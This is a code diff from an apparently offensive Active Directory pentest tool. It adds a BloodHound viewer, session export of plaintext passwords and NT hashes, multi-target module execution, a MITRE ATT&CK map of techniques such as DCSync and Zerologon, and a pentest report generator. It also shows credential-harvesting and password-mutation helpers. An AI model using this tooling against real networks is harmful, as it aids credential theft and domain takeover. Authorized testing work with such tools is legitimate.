+window.addEventListener('resize',resize);
+resize();
+
+// force-directed simulation to spread nodes
+function runForce(iterations){{
+  const k=80, gravity=0.01;
+  for(let iter=0;iter<iterations;iter++){{
+    // repulsion between all node pairs
+    for(let i=0;i<NODES.length;i++){{
+      for(let j=i+1;j<NODES.length;j++){{
+        const dx=NODES[i].x-NODES[j].x;
+        const dy=NODES[i].y-NODES[j].y;
+        const dist=Math.max(1,Math.sqrt(dx*dx+dy*dy));
+        const force=k*k/dist;
+        const fx=dx/dist*force*0.1;
+        const fy=dy/dist*force*0.1;
+        NODES[i].x+=fx; NODES[i].y+=fy;
+        NODES[j].x-=fx; NODES[j].y-=fy;
+      }}
+    }}
+    // attraction along edges
+    EDGES.forEach(e=>{{
+      const s=NODES[e.s],t=NODES[e.t];
+      if(!s||!t) return;
+      const dx=t.x-s.x, dy=t.y-s.y;
+      const dist=Math.max(1,Math.sqrt(dx*dx+dy*dy));
+      const force=(dist-k)*0.05;
+      const fx=dx/dist*force;
+      const fy=dy/dist*force;
+      s.x+=fx; s.y+=fy;
+      t.x-=fx; t.y-=fy;
+    }});
+    // gravity toward center
+    NODES.forEach(n=>{{ n.x*=(1-gravity); n.y*=(1-gravity); }});
+  }}
+  draw();
+}}
+
+// run force in background after load
+setTimeout(()=>runForce(80), 100);
+
+updateStats();
+findDAPaths();
+</script>
+</body></html>'''
+
+    # write HTML file
+    out_path = os.path.join(target.loot_dir, 'bh-view.html')
+    with open(out_path, 'w') as f:
+        f.write(html)
+
+    log(f'{GREEN}BloodHound viewer generated → {WHITE}{out_path}{RESET}','success')
+    log(f'Opening in browser...','info')
+
+    # serve and open
+    port = 8889
+    os.chdir(target.loot_dir)
+    handler = _hs.SimpleHTTPRequestHandler
+    handler.log_message = lambda *a: None
+    try:
+        server = _hs.HTTPServer(('127.0.0.1', port), handler)
+        t = _th.Thread(target=server.serve_forever, daemon=True)
+        t.start()
+        url = f'http://127.0.0.1:{port}/bh-view.html'
+        log(f'Serving at {C0}{url}{RESET} — press Ctrl+C to stop','info')
+        subprocess.Popen(['xdg-open', url], stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL)
+        try:
+            while True: import time; time.sleep(1)
+        except KeyboardInterrupt:
+            server.shutdown()
+            log('Server stopped','info')
+    except OSError:
+        log(f'Port {port} in use — open manually: {C0}{out_path}{RESET}','warn')
+        subprocess.Popen(['xdg-open', out_path], stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL)
+
+
+def _export_session(target):
+    """Export current session state to a shareable JSON file."""
+    import json as _json
+    out_path = os.path.join(target.loot_dir, 'session_export.json')
+    ws = os.path.basename(os.path.dirname(target.loot_dir))
+    data = {
+        'version': f'segfault-ad-v{VERSION}',
+        'exported':   datetime.now().isoformat(),
+        'workspace':  ws,
+        'target': {
+            'domain':   target.domain,
+            'dc':       target.dc,
+            'fqdn':     target.fqdn,
+            'user':     target.user,
+            'password': target.password,
+            'hash':     target.hash,
+        },
+        'results':    _SESSION_RESULTS,
+        'cracked':    [],
+        'hashes':     [],
+    }
+    # include cracked creds
+    cracked_f = os.path.join(target.loot_dir,'cracked.txt')
+    if os.path.exists(cracked_f):
+        data['cracked'] = open(cracked_f).read().splitlines()
+    # include hashes
+    for hf in ['dcsync.txt.ntds','asreproast_hashes.txt','kerberoast_hashes.txt']:
+        fp = os.path.join(target.loot_dir,hf)
+        if os.path.exists(fp):
+            data['hashes'] += open(fp).read().splitlines()
+    # write
+    with open(out_path,'w') as f:
+        _json.dump(data, f, indent=2, default=str)
+    log(f'{GREEN}Session exported → {WHITE}{out_path}{RESET}','success')
+    log(f'{GREY}Share with teammate: scp {out_path} teammate@host:{RESET}','info')
+    hr()
+
+
+def _import_session(target, path):
+    """Import a session from an exported JSON file."""
+    import json as _json
+    if not os.path.exists(path):
+        log(f'File not found: {path}','error'); return
+    try:
+        data = _json.loads(open(path).read())
+    except Exception as e:
+        log(f'Invalid session file: {e}','error'); return
+
+    t = data.get('target',{})
+    log(f'{C0}Importing session from {WHITE}{path}{RESET}','info')
+    log(f'  workspace:  {WHITE}{data.get("workspace","?")}{RESET}','info')
+    log(f'  domain:     {WHITE}{t.get("domain","?")}{RESET}','info')
+    log(f'  user:       {WHITE}{t.get("user","?")}{RESET}','info')
+    log(f'  exported:   {WHITE}{data.get("exported","?")}{RESET}','info')
+
+    ans = input_field('Import target settings + creds','y')
+    if ans.lower() == 'y':
+        if t.get('domain'):   target.domain   = t['domain']
+        if t.get('dc'):       target.dc       = t['dc']
+        if t.get('fqdn'):     target.fqdn     = t['fqdn']
+        if t.get('user'):     target.user     = t['user']
+        if t.get('password'): target.password = t['password']
+        if t.get('hash'):     target.hash     = t['hash']
+
+    ans2 = input_field('Import session results (attack chain)','y')
+    if ans2.lower() == 'y':
+        global _SESSION_RESULTS
+        _SESSION_RESULTS = data.get('results', [])
+        log(f'{GREEN}{len(_SESSION_RESULTS)} result(s) imported into attack map{RESET}','success')
+
+    ans3 = input_field('Import cracked creds to loot dir','y')
+    if ans3.lower() == 'y':
+        cracked = data.get('cracked',[])
+        if cracked:
+            cracked_f = os.path.join(target.loot_dir,'cracked.txt')
+            with open(cracked_f,'a') as f: f.write('\n'.join(cracked)+'\n')
+            log(f'{GREEN}{len(cracked)} cracked cred(s) saved{RESET}','success')
+
+    log(f'{GREEN}Session imported ✓{RESET}','success')
+    hr()
+
+
+def _multi_target(target, args):
+    """Run a module against multiple targets in parallel."""
+    hr()
+    log(f'{C0}Multi-target mode{RESET}','info')
+    log(f'{GREY}Run any module against a list of IPs/hosts in parallel{RESET}','info')
+
+    if args:
+        target_file = args[0]
+    else:
+        target_file = input_field('target file (one IP per line)','')
+    if not target_file or not os.path.exists(target_file):
+        log('File not found','error'); hr(); return
+
+    targets = [l.strip() for l in open(target_file).read().splitlines()
+               if l.strip() and not l.startswith('#')]
+    if not targets:
+        log('No targets in file','error'); hr(); return
+
+    module_name = input_field(f'module to run against {len(targets)} targets','nmap')
+    if module_name not in MODULES:
+        log(f'Unknown module: {module_name}','error'); hr(); return
+
+    log(f'Running {C0}{module_name}{RESET} against {WHITE}{len(targets)}{RESET} targets...','info')
+    hr()
+
+    import copy as _copy, threading as _mth
+    results = {}
+    lock = threading.Lock()
+
+    def _run_one(ip):
+        fake = _copy.copy(target)
+        fake.dc = ip
+        try:
+            mod = MODULES[module_name]()
+            mod.run(fake)
+            with lock: results[ip] = 'done'
+        except Exception as e:
+            with lock: results[ip] = f'error: {e}'
+
+    threads = [threading.Thread(target=_run_one, args=(ip,), daemon=True) for ip in targets]
+    for t in threads: t.start()
+    for t in threads: t.join()
+
+    log(f'{GREEN}Multi-target complete — {len(results)} host(s) processed{RESET}','success')
+    hr()
+
+
+
+# MITRE ATT&CK mapping for modules
+_MITRE_MAP = {
+    'nmap':         ('T1046',  'Network Service Discovery'),
+    'enum':         ('T1087',  'Account Discovery'),
+    'ldapenum':     ('T1069',  'Permission Groups Discovery'),
+    'asreproast':   ('T1558.004', 'AS-REP Roasting'),
+    'kerberoast':   ('T1558.003', 'Kerberoasting'),
+    'spray':        ('T1110.003', 'Password Spraying'),
+    'hashcrack':    ('T1110.002', 'Password Cracking'),
+    'shares':       ('T1135',  'Network Share Discovery'),
+    'dcsync':       ('T1003.006', 'DCSync'),
+    'secretsdump':  ('T1003',  'OS Credential Dumping'),
+    'relay':        ('T1557',  'LLMNR/NBT-NS Poisoning'),
+    'certipy':      ('T1649',  'Steal or Forge Auth Certificates'),
+    'bloodhound':   ('T1069',  'Domain Trust Discovery'),
+    'adrecon':      ('T1087.002', 'Domain Account Discovery'),
+    'exec':         ('T1021.006', 'Remote Services: WinRM'),
+    'pth':          ('T1550.002', 'Pass the Hash'),
+    'ptt':          ('T1550.003', 'Pass the Ticket'),
+    'gpp':          ('T1552.006', 'Group Policy Preferences'),
+    'backupabuse':  ('T1003.002', 'SAM Dump'),
+    'bloody':       ('T1222',  'File and Directory Permissions Modification'),
+    'zerologon':    ('T1190',  'Exploit Public-Facing Application'),
+    'nopac':        ('T1558',  'Steal or Forge Kerberos Tickets'),
+    'pathpwn':      ('T1484',  'Domain Policy Modification'),
+    'snaffler':     ('T1083',  'File and Directory Discovery'),
+    'lsassy':       ('T1003.001', 'LSASS Memory'),
+    'sccm':         ('T1078',  'Valid Accounts'),
+    'trusts':       ('T1482',  'Domain Trust Discovery'),
+}
+
 def _gen_report(target):
     """Generate a full HTML pentest report for the current session."""
     import datetime, html as _html
@@ -9216,8 +11771,9 @@ def _gen_report(target):
     out_path  = os.path.join(loot_dir, f'report_{domain}_{ts}.html')
     os.makedirs(loot_dir, exist_ok=True)
 
+    log(f'Generating report for {WHITE}{domain}{RESET}...','info')
+
     # ── gather data ──────────────────────────────────────────────────────────
-    # credentials from cracked.txt
     creds = []
     cracked_path = os.path.join(loot_dir, 'cracked.txt')
     if os.path.exists(cracked_path):
@@ -9227,24 +11783,21 @@ def _gen_report(target):
                 u, p = line.split(':', 1)
                 creds.append({'user': u.strip(), 'secret': p.strip(), 'type': 'password'})
 
-    # hashes from loot dir
     hashes = []
-    for fname in os.listdir(loot_dir) if os.path.exists(loot_dir) else []:
-        if fname.endswith('.ntds') or fname in ('hashes.txt','ntds.dit.hashes'):
+    for fname in (os.listdir(loot_dir) if os.path.exists(loot_dir) else []):
+        if fname.endswith('.ntds') or fname in ('hashes.txt',):
             for line in open(os.path.join(loot_dir,fname), errors='replace').read().splitlines():
                 if ':::' in line:
                     parts = line.split(':')
                     if len(parts) >= 4:
                         hashes.append({'user': parts[0], 'hash': parts[3]})
 
-    # flags
     flags = {}
     for fname in ('user.txt','root.txt'):
         fpath = os.path.join(loot_dir, fname)
         if os.path.exists(fpath):
             flags[fname.replace('.txt','')] = open(fpath, errors='replace').read().strip()
 
-    # loot files
     loot_files = []
     if os.path.exists(loot_dir):
         for fname in sorted(os.listdir(loot_dir)):
@@ -9254,270 +11807,197 @@ def _gen_report(target):
                 mt = datetime.datetime.fromtimestamp(os.path.getmtime(fpath)).strftime('%H:%M:%S')
                 loot_files.append({'name': fname, 'size': sz, 'time': mt})
 
-    # attack chain from _SESSION_RESULTS
     chain = list(_SESSION_RESULTS)
+
+    # build MITRE ATT&CK coverage
+    mitre_hits = []
+    for r in chain:
+        mod = r.get('module','')
+        if mod in _MITRE_MAP:
+            tid, tname = _MITRE_MAP[mod]
+            mitre_hits.append({'id':tid,'name':tname,'module':mod,'detail':r.get('detail','')})
+
+    # cleanup actions
+    cleanup_items = [{'type':e['type'],'desc':e['desc'],'auto':callable(e.get('undo'))}
+                     for e in _CLEANUP_STACK]
+
+    # severity assessment
+    severity = 'CRITICAL' if any('administrator' in str(r).lower() or 'dcsync' in str(r).lower()
+                                  for r in chain) else \
+               'HIGH' if hashes or creds else \
+               'MEDIUM' if chain else 'LOW'
+    sev_color = {'CRITICAL':'#f85149','HIGH':'#d29922','MEDIUM':'#388bfd','LOW':'#3fb950'}.get(severity,'#888')
 
     # ── build HTML ───────────────────────────────────────────────────────────
     def e(s): return _html.escape(str(s))
+    now_str = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    flag_html = ''
-    if flags:
-        flag_html = '<div class="flags">'
-        if 'user' in flags:
-            flag_html += f'<div class="flag user">🏴 user.txt<span>{e(flags["user"])}</span></div>'
-        if 'root' in flags:
-            flag_html += f'<div class="flag root">🏴 root.txt<span>{e(flags["root"])}</span></div>'
-        flag_html += '</div>'
-
-    chain_html = ''
-    if chain:
-        chain_html = '<div class="chain">'
-        for i, r in enumerate(chain):
-            mod = e(r.get('module','?'))
-            det = e(r.get('detail',''))
-            st  = r.get('status','ok')
-            col = '#4ade80' if st == 'ok' else '#f87171'
-            arrow = ' <span class="arrow">→</span> ' if i < len(chain)-1 else ''
-            chain_html += f'<span class="node" style="border-color:{col}"><b>{mod}</b><br><small>{det}</small></span>{arrow}'
-        chain_html += '</div>'
-
-    creds_html = ''
-    if creds:
-        creds_html = '<table><tr><th>Username</th><th>Secret</th><th>Type</th></tr>'
-        for c in creds:
-            creds_html += f'<tr><td>{e(c["user"])}</td><td class="mono">{e(c["secret"])}</td><td>{e(c["type"])}</td></tr>'
-        creds_html += '</table>'
-
-    hashes_html = ''
-    if hashes:
-        hashes_html = '<table><tr><th>Username</th><th>NT Hash</th></tr>'
-        for h in hashes[:30]:
-            hashes_html += f'<tr><td>{e(h["user"])}</td><td class="mono">{e(h["hash"])}</td></tr>'
-        if len(hashes) > 30:
-            hashes_html += f'<tr><td colspan="2" class="dim">... and {len(hashes)-30} more</td></tr>'
-        hashes_html += '</table>'
-
-    loot_html = ''
-    if loot_files:
-        loot_html = '<table><tr><th>File</th><th>Size</th><th>Time</th></tr>'
-        for f in loot_files:
-            sz = f'{f["size"]:,} B' if f['size'] < 1024 else f'{f["size"]//1024} KB'
-            loot_html += f'<tr><td class="mono">{e(f["name"])}</td><td>{sz}</td><td>{e(f["time"])}</td></tr>'
-        loot_html += '</table>'
-
-    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')
-
-    html_content = f'''<!DOCTYPE html>
+    html = f'''<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>segfault-ad report — {e(domain)}</title>
+<title>Pentest Report — {e(domain)}</title>
 <style>
-  :root {{
-    --bg: #0d0d0d; --bg2: #141414; --bg3: #1a1a1a;
-    --border: #2a2a2a; --text: #e0e0e0; --dim: #666;
-    --green: #4ade80; --pink: #f472b6; --orange: #fb923c;
-    --blue: #60a5fa; --red: #f87171; --purple: #a78bfa;
-  }}
-  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
-  body {{ background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.6; }}
-  .header {{ background: var(--bg2); border-bottom: 1px solid var(--border); padding: 2rem 3rem; display: flex; justify-content: space-between; align-items: flex-start; }}
-  .header h1 {{ font-size: 1.6rem; font-weight: 700; color: var(--green); font-family: monospace; }}
-  .header h1 span {{ color: var(--pink); }}
-  .meta {{ color: var(--dim); font-size: 0.85rem; margin-top: 0.4rem; }}
-  .badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; font-family: monospace; margin-right: 6px; }}
-  .badge.green {{ background: #14532d; color: var(--green); border: 1px solid var(--green); }}
-  .badge.pink  {{ background: #4a044e; color: var(--pink);  border: 1px solid var(--pink); }}
-  .badge.orange{{ background: #431407; color: var(--orange);border: 1px solid var(--orange); }}
-  .content {{ max-width: 1100px; margin: 0 auto; padding: 2rem 3rem; }}
-  .section {{ margin-bottom: 2.5rem; }}
-  .section h2 {{ font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 2px; color: var(--dim); border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; margin-bottom: 1.2rem; }}
-  table {{ width: 100%; border-collapse: collapse; background: var(--bg2); border-radius: 8px; overflow: hidden; }}
-  th {{ background: var(--bg3); color: var(--dim); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; padding: 0.6rem 1rem; text-align: left; }}
-  td {{ padding: 0.6rem 1rem; border-top: 1px solid var(--border); }}
-  td.mono {{ font-family: monospace; color: var(--green); font-size: 0.85rem; }}
-  td.dim {{ color: var(--dim); font-style: italic; }}
-  tr:hover td {{ background: var(--bg3); }}
-  .flags {{ display: flex; gap: 1rem; flex-wrap: wrap; }}
-  .flag {{ background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.5rem; flex: 1; min-width: 280px; }}
-  .flag.user {{ border-color: var(--blue); }}
-  .flag.root {{ border-color: var(--green); }}
-  .flag span {{ display: block; font-family: monospace; font-size: 1.1rem; margin-top: 0.4rem; color: var(--green); word-break: break-all; }}
-  .chain {{ display: flex; flex-wrap: wrap; align-items: center; gap: 0.5rem; padding: 1.2rem; background: var(--bg2); border-radius: 8px; border: 1px solid var(--border); }}
-  .node {{ background: var(--bg3); border: 1px solid #2a2a2a; border-radius: 6px; padding: 0.5rem 0.8rem; font-size: 0.8rem; text-align: center; min-width: 100px; }}
-  .node b {{ color: var(--blue); font-family: monospace; }}
-  .node small {{ color: var(--dim); display: block; margin-top: 2px; font-size: 0.7rem; word-break: break-word; }}
-  .arrow {{ color: var(--dim); font-size: 1.2rem; }}
-  .stats {{ display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2rem; }}
-  .stat {{ background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.5rem; flex: 1; min-width: 140px; }}
-  .stat .val {{ font-size: 2rem; font-weight: 700; color: var(--green); font-family: monospace; }}
-  .stat .lbl {{ color: var(--dim); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }}
-  .empty {{ color: var(--dim); font-style: italic; padding: 1rem; background: var(--bg2); border-radius: 8px; border: 1px solid var(--border); }}
-  .footer {{ border-top: 1px solid var(--border); padding: 1.5rem 3rem; color: var(--dim); font-size: 0.8rem; display: flex; justify-content: space-between; }}
-  .footer span {{ color: var(--green); font-family: monospace; }}
+*{{box-sizing:border-box;margin:0;padding:0}}
+body{{font-family:'Segoe UI',system-ui,sans-serif;font-size:13px;background:#0d1117;color:#c9d1d9;line-height:1.6}}
+.page{{max-width:1100px;margin:0 auto;padding:32px 24px}}
+h1{{font-size:24px;color:#e6edf3;margin-bottom:4px}}
+h2{{font-size:14px;font-weight:600;color:#e6edf3;margin:24px 0 10px;padding-bottom:6px;border-bottom:1px solid #21262d;text-transform:uppercase;letter-spacing:.08em}}
+h3{{font-size:12px;font-weight:600;color:#8b949e;margin-bottom:8px}}
+.topbar{{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:32px;padding-bottom:24px;border-bottom:1px solid #21262d}}
+.brand{{font-size:11px;color:#8b949e;margin-top:4px}}
+.sev{{font-size:11px;font-weight:700;padding:4px 14px;border-radius:99px;border:1px solid;margin-top:8px;display:inline-block}}
+.meta-grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}}
+.meta-card{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:12px 14px}}
+.meta-label{{font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}}
+.meta-val{{font-size:18px;font-weight:600;color:#e6edf3}}
+.meta-val.red{{color:#f85149}}.meta-val.amber{{color:#d29922}}.meta-val.green{{color:#3fb950}}
+.exec-summary{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:16px;margin-bottom:24px;font-size:13px;color:#c9d1d9;line-height:1.7}}
+.chain{{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:8px}}
+.chain-node{{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:6px 10px;font-size:11px}}
+.chain-node b{{color:#e6edf3;display:block}}
+.chain-node small{{color:#8b949e}}
+.chain-arrow{{color:#484f58;font-size:16px;align-self:center}}
+table{{width:100%;border-collapse:collapse;margin-bottom:8px;font-size:12px}}
+th{{text-align:left;padding:6px 10px;background:#161b22;color:#8b949e;font-weight:500;font-size:10px;text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid #21262d}}
+td{{padding:6px 10px;border-bottom:1px solid #21262d;color:#c9d1d9}}
+tr:hover td{{background:#161b22}}
+.mono{{font-family:monospace;font-size:11px;color:#79c0ff}}
+.flag-box{{display:flex;gap:12px;margin-bottom:16px}}
+.flag{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:12px 16px;flex:1}}
+.flag.user{{border-color:rgba(56,139,253,.4)}}
+.flag.root{{border-color:rgba(248,81,73,.4)}}
+.flag-label{{font-size:10px;color:#8b949e;margin-bottom:4px}}
+.flag-val{{font-family:monospace;font-size:13px;color:#79c0ff;word-break:break-all}}
+.mitre-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}}
+.mitre-card{{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:8px 10px}}
+.mitre-id{{font-size:10px;font-weight:600;color:#d29922;margin-bottom:2px}}
+.mitre-name{{font-size:11px;color:#c9d1d9}}
+.mitre-mod{{font-size:10px;color:#8b949e}}
+.cleanup-item{{display:flex;gap:8px;padding:5px 0;border-bottom:1px solid #21262d;font-size:11px}}
+.cleanup-type{{font-size:10px;padding:1px 6px;border-radius:4px;background:#21262d;color:#8b949e;white-space:nowrap;align-self:center}}
+.auto-yes{{color:#3fb950}}.auto-no{{color:#d29922}}
+.section{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:16px;margin-bottom:16px}}
+.dim{{color:#8b949e}}
+.footer{{text-align:center;font-size:10px;color:#484f58;margin-top:32px;padding-top:16px;border-top:1px solid #21262d}}
 </style>
 </head>
 <body>
+<div class="page">
 
-<div class="header">
+<div class="topbar">
   <div>
-    <h1>segfault-ad <span>//</span> {e(domain)}</h1>
-    <div class="meta">{e(dc)} &nbsp;·&nbsp; {now}</div>
-    <div style="margin-top:0.6rem">
-      <span class="badge green">v2.4</span>
-      {"".join(f'<span class="badge pink">🏴 {k}</span>' for k in flags)}
-      {"<span class='badge orange'>⚠ no flags</span>" if not flags else ""}
-    </div>
+    <h1>Active Directory Pentest Report</h1>
+    <div class="brand">segfault.solutions · segfault-ad v{{VERSION}} · {e(now_str)}</div>
+    <div class="sev" style="color:{sev_color};border-color:{sev_color}40">{e(severity)}</div>
+  </div>
+  <div style="text-align:right">
+    <div style="font-size:18px;font-weight:600;color:#e6edf3">{e(domain)}</div>
+    <div class="dim" style="font-size:12px">{e(dc)}</div>
+    <div class="dim" style="font-size:11px">user: {e(target.user or "—")}</div>
   </div>
 </div>
 
-<div class="content">
-
-  <div class="stats">
-    <div class="stat"><div class="val">{len(creds)}</div><div class="lbl">credentials</div></div>
-    <div class="stat"><div class="val">{len(hashes)}</div><div class="lbl">hashes</div></div>
-    <div class="stat"><div class="val">{len(loot_files)}</div><div class="lbl">loot files</div></div>
-    <div class="stat"><div class="val">{len(flags)}/2</div><div class="lbl">flags</div></div>
-    <div class="stat"><div class="val">{len(chain)}</div><div class="lbl">chain steps</div></div>
-  </div>
-
-  {"<div class='section'><h2>flags</h2>" + flag_html + "</div>" if flags else ""}
-
-  <div class="section">
-    <h2>attack chain</h2>
-    {chain_html if chain_html else "<div class='empty'>No chain data — run modules first</div>"}
-  </div>
-
-  <div class="section">
-    <h2>credentials</h2>
-    {creds_html if creds_html else "<div class='empty'>None found — run hashcrack or capture modules</div>"}
-  </div>
-
-  {"<div class='section'><h2>hashes</h2>" + hashes_html + "</div>" if hashes_html else ""}
-
-  <div class="section">
-    <h2>loot files</h2>
-    {loot_html if loot_html else "<div class='empty'>No loot files yet</div>"}
-  </div>
-
+<div class="meta-grid">
+  <div class="meta-card"><div class="meta-label">attack steps</div><div class="meta-val">{len(chain)}</div></div>
+  <div class="meta-card"><div class="meta-label">creds cracked</div><div class="meta-val {'red' if creds else ''}">{len(creds)}</div></div>
+  <div class="meta-card"><div class="meta-label">hashes dumped</div><div class="meta-val {'red' if hashes else ''}">{len(hashes)}</div></div>
+  <div class="meta-card"><div class="meta-label">flags captured</div><div class="meta-val {'green' if flags else ''}">{len(flags)}</div></div>
 </div>
 
-<div class="footer">
-  <div>generated by <span>segfault-ad v2.4</span></div>
-  <div>{now}</div>
+<div class="exec-summary">
+  <strong style="color:#e6edf3">Executive Summary.</strong>&nbsp;
+  Assessment of <strong>{e(domain)}</strong> revealed a <strong style="color:{sev_color}">{e(severity)}</strong> risk posture.
+  {f'The domain controller at <strong>{e(dc)}</strong> was successfully compromised' if hashes else f'Partial access was obtained to <strong>{e(dc)}</strong>'}.
+  {f'A total of <strong>{len(hashes)}</strong> NT hashes were extracted via DCSync.' if hashes else ''}
+  {f'<strong>{len(creds)}</strong> plaintext credential(s) were recovered.' if creds else ''}
+  {f'<strong>{len(flags)}</strong> flag(s) captured.' if flags else ''}
+  {f'<strong>{len(mitre_hits)}</strong> MITRE ATT&CK technique(s) exercised.' if mitre_hits else ''}
+  The attack chain consisted of <strong>{len(chain)}</strong> steps.
+  {'Full domain compromise achieved — all domain credentials at risk.' if severity == 'CRITICAL' else ''}
 </div>
 
-</body>
-</html>'''
+'''
 
-    with open(out_path, 'w') as f:
-        f.write(html_content)
+    # flags
+    if flags:
+        html += '<h2>Flags</h2><div class="flag-box">'
+        if 'user' in flags:
+            html += f'<div class="flag user"><div class="flag-label">🏴 user.txt</div><div class="flag-val">{e(flags["user"])}</div></div>'
+        if 'root' in flags:
+            html += f'<div class="flag root"><div class="flag-label">🏴 root.txt</div><div class="flag-val">{e(flags["root"])}</div></div>'
+        html += '</div>'
 
-    log(f'{GREEN}Report written: {WHITE}{out_path}{RESET}','success')
-    log(f'Open in browser: {C0}xdg-open {out_path}{RESET}','info')
-    try:
-        subprocess.Popen(['xdg-open', out_path],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception:
-        pass
+    # attack chain
+    if chain:
+        html += '<h2>Attack Chain</h2><div class="section"><div class="chain">'
+        for i, r in enumerate(chain):
+            mod = e(r.get('module','?'))
+            det = e(r.get('detail',''))
+            tid, tname = _MITRE_MAP.get(r.get('module',''), ('',''))
+            mitre_str = f'<small style="color:#d29922">{e(tid)}</small><br>' if tid else ''
+            html += f'<div class="chain-node"><b>{mod}</b>{mitre_str}<small>{det}</small></div>'
+            if i < len(chain)-1: html += '<span class="chain-arrow">→</span>'
+        html += '</div></div>'
+
+    # MITRE ATT&CK
+    if mitre_hits:
+        html += '<h2>MITRE ATT&CK Coverage</h2><div class="mitre-grid">'
+        seen = set()
+        for m in mitre_hits:
+            if m['id'] not in seen:
+                seen.add(m['id'])
+                html += f'''<div class="mitre-card">
+                  <div class="mitre-id">{e(m["id"])}</div>
+                  <div class="mitre-name">{e(m["name"])}</div>
+                  <div class="mitre-mod">{e(m["module"])}</div>
+                </div>'''
+        html += '</div><br>'
+
+    # credentials
+    if creds:
+        html += '<h2>Credentials</h2><div class="section"><table><tr><th>Username</th><th>Password</th></tr>'
+        for c in creds:
+            html += f'<tr><td>{e(c["user"])}</td><td class="mono">{e(c["secret"])}</td></tr>'
+        html += '</table></div>'
+
+    # hashes
+    if hashes:
+        html += f'<h2>NT Hashes ({len(hashes)} total)</h2><div class="section"><table><tr><th>Username</th><th>NT Hash</th></tr>'
+        for h in hashes[:50]:
+            html += f'<tr><td>{e(h["user"])}</td><td class="mono">{e(h["hash"])}</td></tr>'
+        if len(hashes) > 50:
+            html += f'<tr><td colspan="2" class="dim">... and {len(hashes)-50} more</td></tr>'
+        html += '</table></div>'
+
+    # cleanup / remediation
+    if cleanup_items:
+        html += '<h2>Remediation — Changes Made</h2><div class="section">'
+        for item in cleanup_items:
+            auto = item['auto']
+            html += f'''<div class="cleanup-item">
+              <span class="cleanup-type">{e(item["type"])}</span>
+              <span style="flex:1">{e(item["desc"])}</span>
+              <span class="{'auto-yes' if auto else 'auto-no'}">{("✓ auto-reverted" if auto else "⚠ manual review")}</span>
+            </div>'''
+        html += '</div>'
+
+    # loot files
+    if loot_files:
+        html += '<h2>Loot Files</h2><div class="section"><table><tr><th>File</th><th>Size</th><th>Time</th></tr>'
+        for f in loot_files:
+            sz = f'{f["size"]:,} B' if f["size"] < 1024 else f'{f["size"]//1024} KB'
+            html += f'<tr><td class="mono">{e(f["name"])}</td><td class="dim">{sz}</td><td class="dim">{e(f["time"])}</td></tr>'
+        html += '</table></div>'
+
+    html += f'<div class="footer">generated by segfault-ad v{VERSION} · {e(now_str)} · segfault.solutions</div>'
+    html += '</div></body></html>'
+
+    with open(out_path,'w') as f: f.write(html)
+    log(f'{GREEN}Report generated → {WHITE}{out_path}{RESET}','success')
+    log(f'Opening in browser...','info')
+    subprocess.Popen(['xdg-open', out_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     hr()
-
-
-def _scan_descriptions(lines, loot_dir, domain):
-    """Scan output lines for passwords hidden in AD description fields. Auto-saves hits."""
-    _pw_re = re.compile(
-        r'(?:password|passwd|pwd|pass)\s*(?:is|=|:)\s*(\S+)|'
-        r'([A-Za-z0-9]{2,}[@#$!*][A-Za-z0-9@#$!*&^%]{4,})',
-        re.IGNORECASE)
-    hits = []
-    for l in lines:
-        if not l.strip() or 'Description' in l: continue
-        # try to extract username:description pairs from nxc/ldeep output
-        # nxc format: PROTO  IP  PORT  DC  username  date  badpw  description...
-        parts = l.split()
-        if len(parts) < 6: continue
-        # find description start — after the badpw digit
-        desc_start = None
-        for i, p in enumerate(parts):
-            if i > 4 and p.isdigit():
-                desc_start = i + 1; break
-        if not desc_start: continue
-        desc = ' '.join(parts[desc_start:])
-        username = parts[4]
-        if not desc or username in ('Administrator','Guest','krbtgt'): continue
-        m = _pw_re.search(desc)
-        if m:
-            pw = (m.group(1) or m.group(2) or '').strip('.,;:')
-            if pw and len(pw) >= 6:
-                log(f'{PINK}🔑 Password in description — {WHITE}{username}{RESET}{PINK}: {WHITE}{pw}{RESET}','warn')
-                cracked = os.path.join(loot_dir,'cracked.txt')
-                with open(cracked,'a') as f: f.write(f'{username}:{pw}\n')
-                _db_save_cred(os.path.basename(loot_dir), domain, username, pw, source='description')
-                add_result('enum', f'cred in desc: {username}')
-                hits.append((username, pw))
-    if hits:
-        log(f'{GREEN}{len(hits)} credential(s) found in descriptions — saved to cracked.txt{RESET}','success')
-    return hits
-
-
-def _gen_password_patterns(passwords, loot_dir):
-    """Generate password variants from cracked passwords and save to loot/patterns.txt."""
-    import string as _str
-    patterns = set()
-    current_year = __import__('datetime').datetime.now().year
-
-    for pw in passwords:
-        if not pw or len(pw) < 3: continue
-        base = pw.strip()
-        patterns.add(base)
-
-        # case variants
-        patterns.add(base.lower())
